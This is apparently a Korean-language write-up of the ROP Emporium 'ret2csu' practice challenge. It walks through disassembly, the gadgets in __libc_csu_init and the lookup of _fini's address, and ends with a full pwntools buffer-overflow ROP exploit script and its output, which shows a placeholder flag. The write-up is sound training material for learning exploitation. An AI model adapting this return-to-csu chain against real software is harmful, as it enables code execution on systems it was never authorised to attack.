# [ret2csu](https://ropemporium.com/challenge/ret2csu.html)
<br />

**Description:**
> We're back in ret2win territory, but this time with no useful gadgets.
How will we populate critical registers without them?

<br />
<br />

# x86_64

**Binary Protections:**
```yaml
ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped

[*] '/home/kali/ROP/ret2csu'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```
<br />

> [!CAUTION]
> > This challenge is very similar to "callme", with the exception of the useful gadgets. Simply call the ret2win() function in the accompanying library with the same arguments you used to beat the "callme" challenge `(ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d)` for the ARM & MIPS binaries, `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)` for the x86_64 binary).

<br />

rop 공격을 준비하기 위해 필요한 가젯을 구해야 합니다. 하지만 해당 바이너리에 저장된 심볼 중에는 `pop`, `mov`, `xchg` 등 `rdx`에 값을 전달할 가젯이 존재하지 않습니다. 

문제에서 언급되는 [논문](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf)은 64비트 리눅스를 대상으로 `__libc_csu_init`을 이용해 ASLR을 우회하는 `Return-to-csu` 공격 기법을 설명합니다. `__libc_csu_init`의 내부 가젯을 통해 `rdi`, `rsi`, `rdx` 등 주요 레지스터를 제어할 수 있어 libc 주소 유출과 `system('/bin/sh')`와 같은 최종 공격을 수행하는 것이 가능합니다.

<br />

```yaml
$ objdump -d ret2csu
Disassembly of section .text:
...
0000000000400617 <usefulFunction>:
  400617:       55                      push   %rbp
  400618:       48 89 e5                mov    %rsp,%rbp
  40061b:       ba 03 00 00 00          mov    $0x3,%edx
  400620:       be 02 00 00 00          mov    $0x2,%esi
  400625:       bf 01 00 00 00          mov    $0x1,%edi
  40062a:       e8 e1 fe ff ff          call   400510 <ret2win@plt>
  40062f:       90                      nop
  400630:       5d                      pop    %rbp
  400631:       c3                      ret
  400632:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
  400639:       00 00 00
  40063c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000400640 <__libc_csu_init>:
  ...
  400680:       4c 89 fa                mov    %r15,%rdx
  400683:       4c 89 f6                mov    %r14,%rsi
  400686:       44 89 ef                mov    %r13d,%edi
  400689:       41 ff 14 dc             call   *(%r12,%rbx,8)
  40068d:       48 83 c3 01             add    $0x1,%rbx
  400691:       48 39 dd                cmp    %rbx,%rbp
  400694:       75 ea                   jne    400680 <__libc_csu_init+0x40>
  400696:       48 83 c4 08             add    $0x8,%rsp
  40069a:       5b                      pop    %rbx
  40069b:       5d                      pop    %rbp
  40069c:       41 5c                   pop    %r12
  40069e:       41 5d                   pop    %r13
  4006a0:       41 5e                   pop    %r14
  4006a2:       41 5f                   pop    %r15
  4006a4:       c3                      ret
  4006a5:       90                      nop
  4006a6:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
  4006ad:       00 00 00
```
```yaml
$ ROPgadget --binary ret2csu | grep rdi
0x00000000004006a3 : pop rdi ; ret
```
- `retwin@plt = 0x400510`
- `pop rbx ; ... pop r15 ; ret = 0x40069a`
- `mov rdx, r15 ; ... pop r15 ; ret = 0x400680`
- `pop rdi ; ret = 0x4006a3`

<br />

```yaml
  400680:       4c 89 fa                mov    %r15,%rdx
  400683:       4c 89 f6                mov    %r14,%rsi
  400686:       44 89 ef                mov    %r13d,%edi
  400689:       41 ff 14 dc             call   *(%r12,%rbx,8)
  ...
```
각 명령어를 수행하고, `call addr`를 호출합니다. `r12`는 베이스 주소, `rbx, 8`은 인덱스를 의미합니다. 따라서 `r12 = 호출하고 싶은 함수의 주소`, `rbx = 0`을 세팅하면 원하는 함수를 호출할 수 있습니다.

그리고 위 명령어 중 `mov edi, r13d`가 수행되는데, 이는 `rdi`의 하위 4바이트 밖에 저장되지 않습니다. 그래서 `ret2win`을 바로 호출하면 `rdi = 0xdeadbeefdeadbeef` 조건 때문에 flag가 출력되지 않습니다. 따라서 주요 레지스터를 건드리지 않으면서 다음 공격을 수행하기에 유리한 `init` 또는 `fini`를 호출해야 합니다.

<br />
<br />

```bash
$ readelf -d ret2csu

Dynamic section at offset 0xe00 contains 26 entries:
  Tag        Type                         Name/Value
 ...
 0x000000000000000c (INIT)               0x4004d0
 0x000000000000000d (FINI)               0x4006b4
 0x0000000000000019 (INIT_ARRAY)         0x600df0
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x600df8
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 ...

pwndbg> telescope 0x600df0 12
...
09:0048│  0x600e38 (_DYNAMIC+56) —▸ 0x4004d0 (_init) ◂— sub rsp, 8
0a:0050│  0x600e40 (_DYNAMIC+64) ◂— 0xd /* '\r' */
0b:0058│  0x600e48 (_DYNAMIC+72) —▸ 0x4006b4 (_fini) ◂— sub rsp, 8

pwndbg> x/10gx &_DYNAMIC
0x600e00:       0x0000000000000001      0x0000000000000001
0x600e10:       0x0000000000000001      0x0000000000000038
0x600e20:       0x000000000000001d      0x0000000000000078
0x600e30:       0x000000000000000c      0x00000000004004d0
0x600e40:       0x000000000000000d      0x00000000004006b4
pwndbg> x/a 0x600e38
0x600e38:       0x4004d0 <_init>
pwndbg> x/a 0x600e48
0x600e48:       0x4006b4 <_fini>
```
`.dynamic`에는 `.init_array`, `.fini.array` 등 태그 값이 들어 있으며, `readelf -d`와 같은 명령어로 시작 주소를 알 수 있습니다. 이 주소를 가지고 `telescope`, `x/gx &_DYNAMIC`와 같은 명령어로 실제 함수 포인터인 `init`과 `fini`의 주소를 찾을 수 있습니다.

<br />

> [!CAUTION]
> ```yaml
>  400689:       41 ff 14 dc             call   *(%r12,%rbx,8)
>  40068d:       48 83 c3 01             add    $0x1,%rbx
>  400691:       48 39 dd                cmp    %rbx,%rbp
>  400694:       75 ea                   jne    400680 <__libc_csu_init+0x40>
>  400696:       48 83 c4 08             add    $0x8,%rsp
> ```
> 위 명령어 수행 순서를 보면 `rbx += 1`을 하고 바로 `rbp`와 `rbx`를 비교합니다. 조건을 통과하지 못하면 `0x400680`로 점프해버리니 주의해야 합니다. 그리고 `add rsp, 0x8`로 인해 `rsp`를 `0x8`만큼 높은 주소로 이동시키므로, `rsp`가 이동한 만큼 오프셋을 보정해야 합니다.

<br />
<br />

```python
from pwn import *

context.log_level = 'error'

p = process('./ret2csu')

pay = b'A'*40
pay += p64(0x40069a)             # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pay += p64(0)                    # rbx
pay += p64(1)                    # rbp
pay += p64(0x600e48)             # r12
pay += p64(0xdeadbeefdeadbeef)   # r13
pay += p64(0xcafebabecafebabe)   # r14
pay += p64(0xd00df00dd00df00d)   # r15

pay += p64(0x400680)   # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call target ; ... ret
pay += p64(0)          # add rsp, 8
pay += p64(0)          # rbx
pay += p64(0)          # rbp
pay += p64(0)          # r12
pay += p64(0)          # r13
pay += p64(0)          # r14
pay += p64(0)          # r15

pay += p64(0x4006a3)  # pop rdi ; ret
pay += p64(0xdeadbeefdeadbeef)
pay += p64(0x400510)  # ret2win

p.send(pay)
p.interactive()
```
```bash
$ python3 test.py
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

> Thank you!
ROPE{a_placeholder_32byte_flag!}
$
```
